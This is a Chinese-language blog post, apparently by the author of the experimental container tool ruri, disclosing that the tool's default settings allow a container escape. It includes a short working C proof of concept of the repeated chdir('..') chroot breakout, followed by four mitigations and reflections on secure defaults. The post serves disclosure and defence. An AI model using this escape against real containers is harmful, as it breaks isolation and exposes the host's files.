---
layout: post
title: 容器安全反思之，当我亲手逃逸出ruri
date: 2025-07-27 22:40:56
cover: /img/escape-inside-ruri.jpg
top_img: /img/escape-inside-ruri.jpg
tags:
- Linux
- C语言
- Container
---
# 前言及叠甲(雾)
开发了好久的ruri，这两天听了一场AOSCC，天塌了。
~~所以责任全在AOSCC（bushi）~~
本文所提到问题仅针对个人项目，不构成任何方面建议。本人强烈推荐使用稳定的容器实现而非和我一起开灵车。
本文仅供技术交流，请自行承担风险。
写文章时作者在旅馆喝多了，至于怎么写出来的，我也不知道。
ruri已有的功能是能防的，只是非默认行为。安全加固建议在文档中也写了，总之，别骂了QwQ知道错了呜呜呜。。。
为什么这篇文章不遵守安全漏洞披露规范？因为ruri是灵车，我们继续创就好了（x
虽然AOSCC演讲刚讲到这个问题。。。。
以及：
For production, I fully recommand you to use tools like [crun](https://github.com/containers/crun), [youki](https://github.com/youki-dev/youki), [containerd](https://containerd.io/), [docker](https://www.docker.com/), [podman](https://podman.io/), [LXC](https://linuxcontainers.org/), [bubblewrap](https://github.com/containers/bubblewrap), they are more secure and stable. This is a non-OCI tool and, you take your own risk using it when you really need. The whole project is experimental!
```
* Your warranty is void.
* I am not responsible for anything that may happen to your device by using this program.
* You do it at your own risk and take the responsibility upon yourself.
* This project is open source, you can make your own fork/rewrite but not to blame the author.
* This program has no Super Cow Powers.
```
# 简单的逃逸
基于AOSCC上姚念庆老师的分享（公开信息，仅做引用），经过和xtex佬的交流后，我也成功构建了一个POC：
（注：以下代码仅供学习交流，请勿用于非法用途）
```c
// 草，懒得搜头文件直接从项目里引了
// 反复鞭尸.jpg
#include "src/include/ruri.h"
int main(void)
{
	/*
	 * WTF? How it works?
	 */
    // Seems we need to chroot() to a subdir once,
    // don't ask me why, idk.
	int chstat = chroot("/tmp");
	// Non-zero value means we are not succeed.
	printf("chroot returned %d\n", chstat);
	for (int i = 0; i < 1000; i++) {
		chdir("..");
	}
    // chroot() again, now we are out to host rootfs.
	chstat = chroot("./");
	printf("chroot returned %d\n", chstat);
	// Wow, out of container!
	// We are now free like a bird!
	execv("/bin/ls", (char *[]){ "ls", NULL });
	return 0;
}
```
原理。。。我也不清楚，毕竟涉及内核态了，总之，很恐怖。
于是我成功把自己和不存在的用户一起创似了。
好了本文结束，作者可以找个垃圾桶把自己丢进去了。
# 坏消息与好消息：
## 坏消息：
ruri的默认行为是寄的。
## 好消息：
我们至少有四种方式可以在不更新ruri的基础上解决这个问题：
1. drop掉CAP_SYS_CHROOT，这样chroot()就会失败
2. 开启unshare，因为unshare会自动先尝试pivot_root()
3. 使用rootless模式，虽然我也不知道为什么能防
4. 开启seccomp，用`--deny-syscalls chroot`可以拒绝chroot()

至少咱应该不用以死谢罪吧。。。（心虚）
但是：
## 坏消息：
1. 以上这些，在写这篇文章之前，都不是默认行为
2. 用户并不懂这些，甚至我见过有用户直接一个`--privileged`选项干掉所有保护
3. 我依稀记得，当时是为了兼容性考虑才保留CAP_SYS_CHROOT，但我清楚的知道，我忘了到底是为什么

好了作者要找个垃圾桶把自己丢进去了。
# 反思一，我们如何构建默认行为
更多默认启用的安全选项意味着更大的限制。
举个例子，如果我们默认开启no_new_privs，那么用户将无法通过su命令切换回root用户。
举个鞭尸自己的例子，ruri的内置seccomp规则一直没有充分测试，而且之前确实被它创飞过。
更极端的例子就是，我们自然可以直接开seccomp的传统模式，但是，这样容器也就不可用了。就像AOSCC上有一段是这样讲的：什么都没有的话，一块石头最安全了，但他也仅仅是一块石头。
docker等项目的默认行为确实有很大的参考价值，但是，他们并不完全适用于ruri这样的项目，毕竟我们要支持内核功能完全受限的环境。
在实际开发中，这样的问题其实有更多。有些当时为了修复一个已经被忘了且没有记录的问题的补丁成了默认行为，有些时候，为了兼容性，我们不得不在尝试更安全的行为失败时，fallback倒一个并非安全的行为。
当ruri被扩展到rurima，又多了一个新的问题。国内docker镜像都非相对可信，可如果不支持镜像，国内用户会很难受。因此我也只能做折中，在用户使用非官方镜像时输出一个警告~~（并非折中）~~
我们有时候不得不承认，哪怕我们支持再多的特性，默认行为也只能是一个折中后的结果。
哪怕这并不应当是作者因为知识浅薄写出漏洞的借口。
# 反思二，用户有没有义务去了解背后原理
我个人认为，我看未必，实则不然，恰恰相反，~~天理难容~~
用户自然需要对自己的行为负责，但是，作为开发者的我，显然责任更大。
软件的本质是一种减轻用户心智负担和使用成本的抽象，我们自然是让用户越轻松越好。至少，就像AOSCC上一位佬说的那样，我们应当比用户更了解我们的程序。
尤其是，当默认行为有严重的副作用，作者却未对此说明，甚至像我一样，根本不知道时。
# 反思三，当我们真的来到生产环境
那寄了，咱只能以死谢罪了。。。
很庆幸，我还年轻，只是一个爱好者的身份，ruri也并不是被广泛使用的项目，至少这辈子应该不会见到这东西进生产环境，~~否则我要去连着自己一起骂一顿了~~
但我们真的，不得不去考虑，为我们的程序负责。
以及，在生产环境下，尽量不要用未经广泛验证的项目，会变得不幸
# 结语
我一直相信，一个项目的构建，要从非零值开始，它至少需要先有雏形，再去完善。
在开始开发ruri之前，我甚至没有接触过C语言，好吧，说实话我只写过一点shell。
这几年的开发，确实让我的技术有了些许进步，因此，对于拿自己的开源项目当试验场的行为，我必须表示：
sorry, not sorry
最起码只是实验性项目，我们的灵车还会继续发车。无需麻醉，一样情不自禁high起来～
好吧，不开玩笑地说，很感谢此次AOSCC上各位大佬的分享，也确实让我意识到自己的很多不足。
我仍将相信，我终会有能力构建出更完善的项目，哪怕会犯错。
但我将更加努力。
但我将更加警惕。
好了作者要找个垃圾桶把自己丢进去了，bye～